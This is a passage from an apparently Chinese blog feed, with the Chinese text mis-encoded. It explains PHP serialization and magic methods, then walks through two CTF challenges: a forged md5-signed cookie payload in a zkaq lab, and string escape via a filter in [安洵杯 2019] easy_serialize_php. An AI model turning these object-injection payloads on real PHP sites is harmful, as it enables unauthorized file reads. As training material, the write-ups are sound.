<p># Automatically excerpt description in homepage as preamble text.</p>
<p>excerpt_description: true</p>
</blockquote>
<p>åœ¨æ–‡ç« çš„mdä¸­å¯ä»¥æ·»åŠ <code>description: &#39;&#39;</code>å…¶ä¸­é‡Œé¢çš„å†…å®¹å°±ä¼šæ˜¾ç¤ºåœ¨é¦–é¡µä¸Š å¦‚æœå‘è¿™æ ·å¡«å†™ï¼Œå°±ä¸ä¼šåœ¨é¡µé¢ä¸Šæ˜¾ç¤ºä¸œè¥¿ã€‚</p>
<br>

<p>è¿™æ¬¡çªç„¶æœ‰ä¸¤ä¸ªé¡µé¢å…¨éƒ¨åŠ è½½åœ¨äº†ä¸»é¡µä¸Šï¼Œçœ‹äº†ä¸‹æ˜¯æ²¡æœ‰æ·»åŠ descriptionçš„åŸå› </p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>phpååºåˆ—åŒ–</title>
    <url>/posts/7c19cc12/</url>
    <content><![CDATA[<h3 id="åºåˆ—åŒ–-ä¸-ååºåˆ—åŒ–"><a href="#åºåˆ—åŒ–-ä¸-ååºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ– ä¸ ååºåˆ—åŒ–"></a>åºåˆ—åŒ– ä¸ ååºåˆ—åŒ–</h3><p>åºåˆ—åŒ–: æŠŠå¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦åºåˆ—çš„è¿‡ç¨‹<br>ååºåˆ—åŒ–: æŠŠå­—ç¬¦åºåˆ—æ¢å¤ä¸ºå¯¹è±¡çš„è¿‡ç¨‹  </p>
<p><code>serialize()</code><br><code>unserialize()</code></p>
<h3 id="phpåºåˆ—åŒ–"><a href="#phpåºåˆ—åŒ–" class="headerlink" title="phpåºåˆ—åŒ–"></a>phpåºåˆ—åŒ–</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a - array                 	b - boolean  </span><br><span class="line">d - double                 	i - integer</span><br><span class="line">o - common object         	r - reference</span><br><span class="line">s - string                 	C - custom object</span><br><span class="line">O - class                  	N - null</span><br><span class="line">R - pointer reference      	U - unicode string</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$sites</span> = <span class="keyword">array</span>(<span class="string">&#x27;Dog&#x27;</span>, <span class="string">&#x27;Cat&#x27;</span>, <span class="string">&#x27;Zard&#x27;</span>);</span><br><span class="line"><span class="variable">$serialized_data</span> = serialize(<span class="variable">$sites</span>);</span><br><span class="line"><span class="keyword">echo</span>  <span class="variable">$serialized_data</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;s:<span class="number">3</span>:<span class="string">&quot;Dog&quot;</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;Cat&quot;</span>;i:<span class="number">2</span>;s:<span class="number">4</span>:<span class="string">&quot;Zard&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Show_info</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span>  <span class="keyword">$this</span>-&gt;name .<span class="string">&#x27; is &#x27;</span>. <span class="keyword">$this</span>-&gt;age .<span class="string">&#x27;years old.&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$s</span>-&gt;name = <span class="string">&#x27;Mamor&#x27;</span> ;</span><br><span class="line"><span class="variable">$s</span>-&gt;age = <span class="number">21</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;Show_info();</span><br><span class="line"></span><br><span class="line">print_r(serialize(<span class="variable">$s</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">print_r(unserialize(<span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;Mamor&quot;;s:3:&quot;age&quot;;i:21;&#125;&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> Mamor is <span class="number">21</span>years old.</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Mamor&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">21</span>;&#125;</span><br><span class="line">User <span class="keyword">Object</span> ( [name] =&gt; Mamor [age] =&gt; <span class="number">21</span> )</span><br></pre></td></tr></table></figure>

<p><code>a:3:&#123;i:0;s:3:&quot;Dog&quot;;i:1;s:3:&quot;Cat&quot;;i:2;s:4:&quot;Zard&quot;;&#125;</code></p>
<p><code>å¯¹è±¡ç±»å‹:é•¿åº¦:&#123;é•¿åº¦:ç±»å‹:å€¼,é•¿åº¦:ç±»å‹:å€¼,é•¿åº¦:ç±»å‹:å€¼&#125;</code></p>
<p><code>O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;Mamor&quot;;s:3:&quot;age&quot;;i:21;&#125;</code></p>
<p><code>å¯¹è±¡ç±»å‹:é•¿åº¦:ç±»åï¼šç±»ä¸­å˜é‡ä¸ªæ•°:&#123;ç±»å‹ï¼šé•¿åº¦ï¼šå€¼ï¼Œç±»å‹ï¼šé•¿åº¦ï¼šå€¼ï¼Œç±»å‹ï¼šé•¿åº¦ï¼šå€¼&#125;</code><br><br></p>
<h3 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h3><p><a href="https://segmentfault.com/a/1190000007250604">PHPä¹‹åå…­ä¸ªé­”æœ¯æ–¹æ³•è¯¦è§£</a></p>
<blockquote>
<p>__construct()    å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨<br>__destruct()        å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨<br>__toString()        å½“ååºåˆ—åŒ–åçš„å¯¹è±¡è¢«è¾“å‡ºçš„æ—¶å€™(è½¬åŒ–ä¸ºå­—ç¬¦ä¸²çš„æ—¶å€™)è¢«è°ƒç”¨<br>__sleep()             åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¢«è°ƒç”¨<br>__wakeup            åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;aaaaa&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;bbbbb&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27; __construct&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27; __destruct()&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;__wakeup()&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;__sleep()&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">	<span class="comment">// åˆ›å»ºå¯¹è±¡æ—¶ä¼šè°ƒç”¨ __construct()</span></span><br><span class="line">	<span class="variable">$obj</span> = <span class="keyword">new</span> test();  </span><br><span class="line"></span><br><span class="line">	<span class="variable">$serialize</span> = serialize(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;serialize: &#x27;</span> .<span class="variable">$serialize</span>. <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$unserialize</span> = unserialize(<span class="variable">$serialize</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$obj</span>-&gt;aaa();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//å¯¹è±¡é”€æ¯æ—¶ä¼šè°ƒç”¨ __destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">è¾“å‡ºï¼š</span><br><span class="line">__construct</span><br><span class="line">__sleep()</span><br><span class="line">serialize: N;</span><br><span class="line">aaaaa</span><br><span class="line">__destruct()</span><br></pre></td></tr></table></figure>

<br>

<h3 id="zkaqé¶åœºé¢˜ç›®"><a href="#zkaqé¶åœºé¢˜ç›®" class="headerlink" title="zkaqé¶åœºé¢˜ç›®"></a>zkaqé¶åœºé¢˜ç›®</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">flag in ./flag.php </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">readme</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> highlight_file(<span class="string">&#x27;Readme.txt&#x27;</span>, <span class="literal">true</span>).highlight_file(<span class="keyword">$this</span>-&gt;source, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="keyword">new</span> readme();</span><br><span class="line">    <span class="variable">$s</span>-&gt;source = <span class="keyword">__FILE__</span>;  <span class="comment">//è¿™é‡Œå­˜åœ¨å¯æ§å‚æ•°ï¼Œå¯ä»¥å°è¯•æ„é€ åºåˆ—åŒ–å¯¹è±¡flag.php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$todos = [];</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;todos&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;todos&#x27;</span>];</span><br><span class="line">    <span class="variable">$h</span> = substr(<span class="variable">$c</span>, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">    <span class="variable">$m</span> = substr(<span class="variable">$c</span>, <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="variable">$m</span>) === <span class="variable">$h</span>)&#123;</span><br><span class="line">        <span class="variable">$todos</span> = unserialize(<span class="variable">$m</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$c=$h+$m=md5(m)+$m</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;text&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$todo</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;text&#x27;</span>];</span><br><span class="line">    <span class="variable">$todos</span>[] = <span class="variable">$todo</span>;</span><br><span class="line">    <span class="variable">$m</span> = serialize(<span class="variable">$todos</span>);</span><br><span class="line">    <span class="variable">$h</span> = md5(<span class="variable">$m</span>);</span><br><span class="line">    setcookie(<span class="string">&#x27;todos&#x27;</span>, <span class="variable">$h</span>.<span class="variable">$m</span>);</span><br><span class="line">    header(<span class="string">&#x27;Location: &#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Readme&lt;/h1&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;?source&quot;</span>&gt;&lt;h2&gt;Check Code&lt;/h2&gt;&lt;/a&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">foreach</span>(<span class="variable">$todos</span> <span class="keyword">as</span> <span class="variable">$todo</span>):<span class="meta">?&gt;</span></span><br><span class="line">    &lt;li&gt;<span class="meta">&lt;?=</span><span class="variable">$todo</span><span class="meta">?&gt;</span>&lt;/li&gt;           <span class="comment">//  &lt;=== <span class="meta">&lt;?php</span> echo $todo <span class="meta">?&gt;</span>çš„ç®€å†™</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endforeach</span>;<span class="meta">?&gt;</span></span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> href=<span class="string">&quot;.&quot;</span>&gt;</span><br><span class="line">    &lt;textarea name=<span class="string">&quot;text&quot;</span>&gt;&lt;/textarea&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;store&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt; </span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">readme</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> highlight_file(<span class="string">&#x27;readme.txt&#x27;</span>,<span class="literal">true</span>).highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> readme();</span><br><span class="line"><span class="variable">$s</span> -&gt;source = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span> = [<span class="variable">$s</span>];</span><br><span class="line"><span class="keyword">echo</span> md5(serialize(<span class="variable">$s</span>)).serialize(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>e2d4f7dcc43ee1db7f69e76303d0105ca:1:&#123;i:0;O:6:&quot;readme&quot;:1:&#123;s:6:&quot;source&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;</code>å…ˆè¿›è¡Œä¸€æ¬¡urlç¼–ç ç„¶åä½¿ç”¨cookieä¼ å‚</p>
<p><code>todos=e2d4f7dcc43ee1db7f69e76303d0105ca%3A1%3A%7Bi%3A0%3BO%3A6%3A%22readme%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D</code>æœ€ç»ˆå¾—åˆ°<code>zkz&#123;UNs_what_what?&#125;</code></p>
<br>

<h3 id="å®‰æ´µæ¯-2019-easy-serialize-php1"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php1" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php1"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php1</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœ $function = phpinfo ä¼šå¾—åˆ°phpinfoé¡µé¢ï¼Œå¾—åˆ°äº†flagæ–‡ä»¶åä¸º d0g3_f1ag.php    ï¼Œæƒ³åŠæ³•å»è¯»å–flagæ–‡ä»¶å»å¾—åˆ°flag</p>
<p>åé¢çš„wpçœ‹äº†ä¸‹å¸ˆå‚…ä»¬çš„wpï¼Œä½¿ç”¨çš„å­—ç¬¦é€ƒé€¸</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$str1</span>=<span class="string">&#x27;a:2:&#123;i:0;s:5:&quot;Mamor&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$str1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;å«æœ‰åƒåœ¾å‚æ•°çš„:&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$str2</span>=<span class="string">&#x27;a:2:&#123;i:0;s:5:&quot;Mamor&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;aaaåƒåœ¾å‚æ•°w(ï¾ŸĞ”ï¾Ÿ)w&#x27;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$str2</span>));</span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;Mamor&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;aaaaa&quot;</span> &#125;</span><br><span class="line">å«æœ‰åƒåœ¾å‚æ•°çš„:</span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;Mamor&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;aaaaa&quot;</span> &#125; </span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å°±ç®—æ˜¯æœ‰åƒåœ¾å‚æ•°ï¼Œåœ¨è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ä¹Ÿä¸ä¼šå‡ºç°ï¼Œä¸ä¼šå½±å“ååºåˆ—åŒ–æ­£å¸¸è¿è¡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br></pre></td></tr></table></figure>

<p>æ¸…ç©º$_SESSIONå˜é‡å€¼ï¼Œå¹¶é‡æ–°èµ‹å€¼</p>
<p><code>extract($_POST);</code>å¯¹postä¼ å‚è¿›è¡Œäº†å˜é‡è¦†ç›–</p>
<p>åç»­å¯ä»¥åªçœ‹è¿™äº›ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">... </span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨filter()å‡½æ•°ä¸­è¿‡æ»¤æ‰äº†php,flag,php5,php4,fl1g</p>
<p>file_get_contents()å‡½æ•°å¯ä»¥å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œ è®©base64ç¼–ç çš„å€¼ä¸ºflagçš„æ‰€åœ¨æ–‡ä»¶å ï¼Œ</p>
<p>å³d0g3_f1ag.phpâ€“&gt;base64ç¼–ç åä¸º <code>ZDBnM19mMWFnLnBocA==</code>(20ä½) ååºåˆ—åŒ–åä¸º <code>s:3:&quot;img&quot;,s:20,&quot;ZDBnM19mMWFnLnBocA==&quot;</code></p>
<p>çœ‹äº†ä¸‹Leena_c9a7å¸ˆå‚…çš„wpï¼Œå½“åå°å¦‚æœå­˜åœ¨è¿‡æ»¤çš„è¯ $_SESSIONæ•°ç»„çš„é”®å€¼ä¼šå‘ç”Ÿå˜åŒ–ï¼Œæ—¢ç„¶æ— æ³•å»æ§åˆ¶imgçš„å€¼ï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™é“é¢˜ç›®æœ¬èº«çš„è¿‡æ»¤å™¨ï¼Œ</p>
<p><code>post:_SESSION[flagflag]=&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></p>
<p><code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code>æ˜¯é¢„æœŸè¾“å‡ºçš„åºåˆ—åŒ–å­—ç¬¦</p>
<p><img src="/posts/7c19cc12/1.PNG"></p>
<p>ç»è¿‡filterè¿‡æ»¤ç©ä¹‹å flagflagä¼šæ›¿æ¢ä¸ºç©º</p>
<p><code>a:2:&#123;s:8:&quot;flagflag&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code>å˜ä¸º</p>
